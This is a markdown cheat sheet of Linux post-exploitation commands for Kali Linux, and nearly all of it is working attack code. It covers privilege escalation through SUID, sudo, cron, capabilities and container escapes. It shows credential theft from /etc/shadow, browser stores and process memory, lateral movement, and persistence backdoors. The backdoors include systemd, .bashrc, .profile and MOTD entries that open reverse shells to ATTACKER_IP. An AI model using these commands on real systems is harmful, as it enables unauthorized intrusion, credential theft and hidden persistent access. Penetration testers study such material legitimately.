# PERSISTENCE Tools - Kali Linux

> *"Linux is your playground. Every misconfiguration is an opportunity."*

## Enumeration Tools

### LinPEAS
```bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Run from local copy
./linpeas.sh

# Save output
./linpeas.sh -a > linpeas_output.txt

# Specific checks
./linpeas.sh -s  # Superfast (don't check for files)
./linpeas.sh -P  # Password checks
./linpeas.sh -o  # Only interesting perms

# With colors (best for viewing)
./linpeas.sh | tee linpeas.txt
```

### LinEnum
```bash
# Basic run
./LinEnum.sh

# Thorough mode
./LinEnum.sh -t

# Report to file
./LinEnum.sh -r report.txt

# Keyword search
./LinEnum.sh -k password
```

### linux-exploit-suggester
```bash
# Download
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

# Run
./linux-exploit-suggester.sh

# With specific kernel
./linux-exploit-suggester.sh --kernel 4.15.0-20
```

### pspy (Process Monitor)
```bash
# Monitor processes (unprivileged)
./pspy64

# Verbose mode
./pspy64 -pf -i 1000

# Watch specific directories
./pspy64 -r /tmp -r /home
```

## Privilege Escalation

### SUID/SGID Exploitation

#### Finding SUID Binaries
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find both
find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null

# Check GTFOBins for exploitation
# https://gtfobins.github.io/
```

#### GTFOBins Exploitation Examples
```bash
# SUID find
./find . -exec /bin/sh -p \; -quit

# SUID vim
./vim -c ':!/bin/sh'

# SUID python
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# SUID nmap (old versions)
./nmap --interactive
!sh

# SUID cp
./cp /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p

# SUID env
./env /bin/sh -p
```

### Sudo Exploitation

#### Enumeration
```bash
# Check sudo permissions
sudo -l

# Check sudo version
sudo -V

# List as specific user
sudo -l -U username
```

#### Common Misconfigurations
```bash
# LD_PRELOAD exploitation
# If env_keep includes LD_PRELOAD:
echo 'int _init() { setuid(0); setgid(0); system("/bin/bash -p"); }' > /tmp/shell.c
gcc -shared -fPIC -nostartfiles -o /tmp/shell.so /tmp/shell.c
sudo LD_PRELOAD=/tmp/shell.so /allowed/program

# LD_LIBRARY_PATH
# Similar technique with shared libraries

# NOPASSWD with wildcards
# If: user ALL=(ALL) NOPASSWD: /usr/bin/find *
sudo find /etc -exec /bin/sh \;

# Binary PATH hijacking
# If: user ALL=(ALL) NOPASSWD: /home/user/script.sh
# And script calls: tar (without full path)
export PATH=/tmp:$PATH
echo '/bin/bash' > /tmp/tar
chmod +x /tmp/tar
sudo /home/user/script.sh
```

### Cron Jobs

#### Enumeration
```bash
# System cron
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# User cron
crontab -l
ls -la /var/spool/cron/crontabs/

# Check writable cron scripts
find /etc/cron* -type f -perm -o+w 2>/dev/null
```

#### Exploitation
```bash
# If cron script is writable
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /path/to/script.sh
# Wait for cron, then:
/tmp/bash -p

# PATH hijacking in cron
# If cron runs: cd /tmp && backup.sh
# And PATH doesn't have /usr/bin first:
echo '/bin/bash -p > /tmp/shell' > /tmp/backup.sh
chmod +x /tmp/backup.sh

# Wildcard exploitation
# If cron runs: tar cf /backup/backup.tar *
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh shell.sh'
```

### Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Dangerous capabilities
# cap_setuid+ep - Can set UID
# cap_net_raw+ep - Raw sockets (network)
# cap_dac_override+ep - Override DAC
# cap_dac_read_search+ep - Read any file
# cap_sys_admin+ep - Various admin ops

# Exploitation examples
# Python with cap_setuid
./python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
./perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash"'

# Tar with cap_dac_read_search
./tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
```

### Kernel Exploits

```bash
# Check kernel version
uname -r
uname -a
cat /proc/version

# Find exploits
./linux-exploit-suggester.sh
searchsploit linux kernel $VERSION

# Notable recent exploits
# DirtyPipe (CVE-2022-0847) - Kernel 5.8+
# DirtyCow (CVE-2016-5195) - Kernel 2.x-4.x
# PwnKit (CVE-2021-4034) - Polkit pkexec
```

### Container Escapes

```bash
# Check if in container
cat /proc/1/cgroup
ls -la /.dockerenv

# Docker socket mounted
ls -la /var/run/docker.sock
docker images
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Privileged container
fdisk -l                    # Can see host disks
mount /dev/sda1 /mnt
chroot /mnt

# SYS_ADMIN capability
mount -t cgroup -o rdma cgroup /mnt
```

## Credential Harvesting

### Password Files
```bash
# Shadow file (if readable)
cat /etc/shadow

# Unshadowed format
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt

# Password in configs
grep -r "password" /etc/ 2>/dev/null
grep -r "passwd" /var/www/ 2>/dev/null
find / -name "*.conf" -exec grep -l "pass" {} \; 2>/dev/null
```

### SSH Keys
```bash
# Find SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Check authorized_keys
cat ~/.ssh/authorized_keys
find / -name "authorized_keys" 2>/dev/null

# SSH agent
echo $SSH_AUTH_SOCK
ssh-add -l
```

### Browser/Application Credentials
```bash
# Firefox
cat ~/.mozilla/firefox/*.default/logins.json
sqlite3 ~/.mozilla/firefox/*.default/signons.sqlite "SELECT * FROM moz_logins"

# Chrome
sqlite3 ~/.config/google-chrome/Default/Login\ Data "SELECT * FROM logins"

# History files
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
```

### Memory Extraction
```bash
# Process memory
gcore PID

# /proc memory
cat /proc/PID/maps
cat /proc/PID/mem

# Strings from memory
strings /proc/PID/mem | grep -i password
```

## Lateral Movement

### SSH
```bash
# With password
ssh user@target

# With key
ssh -i id_rsa user@target

# Port forwarding
ssh -L 8080:localhost:80 user@target      # Local
ssh -R 8080:localhost:80 user@target      # Remote
ssh -D 9050 user@target                    # Dynamic SOCKS

# ProxyJump
ssh -J jumphost user@target
```

### Remote Execution
```bash
# SSH command execution
ssh user@target 'whoami'

# psexec.py (Impacket)
psexec.py domain/user:password@target
psexec.py -hashes :NTLMHASH domain/user@target

# wmiexec.py
wmiexec.py domain/user:password@target

# smbexec.py
smbexec.py domain/user:password@target
```

## Persistence Mechanisms

### SSH Authorized Keys
```bash
# Add your key
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# System-wide (as root)
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
```

### Cron Persistence
```bash
# User cron
(crontab -l; echo "* * * * * /tmp/shell.sh") | crontab -

# System cron (as root)
echo "* * * * * root /tmp/shell.sh" >> /etc/crontab

# Cron.d
echo "* * * * * root /tmp/shell.sh" > /etc/cron.d/backdoor
```

### Systemd Service
```bash
# Create service file
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable backdoor
systemctl start backdoor
```

### Bashrc/Profile
```bash
# Add to .bashrc
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> ~/.bashrc

# Add to .profile
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> ~/.profile
```

### MOTD (Message of the Day)
```bash
# Writable MOTD scripts (some distros)
echo '#!/bin/bash' > /etc/update-motd.d/backdoor
echo 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &"' >> /etc/update-motd.d/backdoor
chmod +x /etc/update-motd.d/backdoor
```

### PAM Backdoor
```bash
# Modify pam_unix.so to accept backdoor password
# Requires compiling custom PAM module
# High complexity, high detection risk
```

## Quick Reference

### Enumeration Checklist
```
[ ] System info (uname, /etc/*release)
[ ] Current user (id, whoami, groups)
[ ] Users (/etc/passwd, last, who)
[ ] Network (ip a, ss, /etc/hosts)
[ ] Processes (ps aux)
[ ] SUID/SGID (find -perm)
[ ] Capabilities (getcap)
[ ] Sudo (sudo -l)
[ ] Cron (crontab, /etc/cron*)
[ ] Services (systemctl)
[ ] Writable files (find -writable)
[ ] Config files (grep password)
[ ] SSH keys (find id_rsa)
[ ] History files (.bash_history)
```

### Common PrivEsc Paths
```
SUID binary → GTFOBins
Sudo misconfiguration → Command escape
Writable cron script → Inject payload
Weak service permissions → Modify binary
Kernel CVE → Compile and run exploit
Docker socket → Mount host filesystem
```
